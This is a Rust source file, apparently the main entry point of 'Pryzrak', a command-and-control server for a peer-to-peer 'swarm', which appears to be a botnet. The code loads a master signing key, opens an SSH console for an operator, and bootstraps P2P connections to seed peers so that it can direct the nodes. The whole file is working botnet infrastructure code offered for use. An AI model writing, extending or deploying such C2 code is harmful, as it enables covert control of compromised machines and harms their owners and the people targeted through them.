//! # Pryzrak C2 Server
//!
//! Main entry point for the Pryzrak Command & Control node.

use log::{info, error};
use clap::Parser;
use std::fs;
use std::path::PathBuf;
use ed25519_dalek::{SigningKey, SecretKey};
use std::sync::Arc;
use tokio::net::TcpListener;

mod crypto;
mod network;
mod ssh;

use network::P2PService;
use ssh::{PryzrakServer, PryzrakSession};

#[derive(Parser, Debug)]
#[command(name = "Pryzrak C2 Server")]
#[command(version = "2.0")]
#[command(about = "SSH-based C2 Controller for Pryzrak Swarm", long_about = None)]
struct Cli {
    #[arg(long, default_value = "keys")]
    key: PathBuf,

    #[arg(long, default_value_t = 12961)]
    port: u16,
}

fn load_master_key(path: &PathBuf) -> SigningKey {
    match fs::read(path) {
        Ok(bytes) => {
            if bytes.len() == 32 {
                let array: [u8; 32] = bytes.try_into().expect("32 bytes");
                let secret: SecretKey = array;
                SigningKey::from(secret)
            } else if bytes.len() == 64 {
                let array: [u8; 32] = bytes[0..32].try_into().expect("32 bytes");
                let secret: SecretKey = array;
                SigningKey::from(secret)
            } else {
                eprintln!("ERROR: Invalid key file length at {:?}. Expected 32 or 64 bytes, got {}.", path, bytes.len());
                eprintln!("Generate key with: openssl rand 32 > {}", path.display());
                std::process::exit(1);
            }
        }
        Err(e) => {
            eprintln!("ERROR: Could not load Master Key at {:?}: {}", path, e);
            eprintln!("Create key file with: openssl rand 32 > {}", path.display());
            std::process::exit(1);
        }
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::init();
    let cli = Cli::parse();
    
    let c2_key_path = cli.key.join("pryzrak_c2.key");
    let master_key = load_master_key(&c2_key_path);
    info!("Master Key Loaded from {:?}", c2_key_path);
    
    let keys_dir = cli.key.clone();

    // Generate Host Key for SSH
    let shk = russh_keys::key::KeyPair::generate_ed25519().unwrap();
    let mut config_mut = russh::server::Config::default();
    config_mut.keys.push(shk);
    config_mut.inactivity_timeout = Some(std::time::Duration::from_secs(3600));
    config_mut.auth_rejection_time = std::time::Duration::from_secs(1);
    let config = Arc::new(config_mut);

    // Bind and Listen
    let addr = format!("0.0.0.0:{}", cli.port);
    info!("Pryzrak C2 SSH Service Starting on {}", addr);
    info!("Connect via: ssh admin@<IP> -p {}", cli.port);
    
    let listener = TcpListener::bind(&addr).await.expect("Bind failed");
    
    // Initialize P2P Service
    let p2p_service = Arc::new(P2PService::new(Arc::new(master_key.clone())).await.expect("Failed to bind P2P"));
    
    // Spawn P2P Background Tasks
    let p2p_for_bg = p2p_service.clone();
    tokio::spawn(async move {
        p2p_for_bg.start().await;
    });

    // Spawn Bootstrap Task
    let p2p_for_boot = p2p_service.clone();
    tokio::spawn(async move {
        let seeds = network::resolve_peers().await;
        for (ip, port) in seeds {
             if let Ok(addr) = format!("{}:{}", ip, port).parse() {
                 p2p_for_boot.add_peer(addr).await;
             }
        }
    });

    // Create Server Factory
    let server_factory = PryzrakServer::new(Arc::new(master_key), p2p_service, keys_dir.clone());

    loop {
        let (stream, remote_addr) = listener.accept().await.unwrap();
        info!("[+] Incoming Connection from {}", remote_addr);
        
        let config = config.clone();
        let state = server_factory.state.clone();
        let key = server_factory.master_key.clone();
        let p2p = server_factory.p2p_service.clone();
        let keys_dir_clone = server_factory.keys_dir.clone();
        
        let session_handler = PryzrakSession {
            state,
            session_state: std::sync::Arc::new(std::sync::Mutex::new(crate::ssh::server::SessionState { is_busy: false })),
            master_key: key,
            p2p_service: p2p,
            keys_dir: keys_dir_clone,
            cmd_buffer: String::new(),
        };

        tokio::spawn(async move {
            if let Err(e) = russh::server::run_stream(config, stream, session_handler).await {
                error!("SSH Session Error: {:?}", e);
            }
        });
    }
}
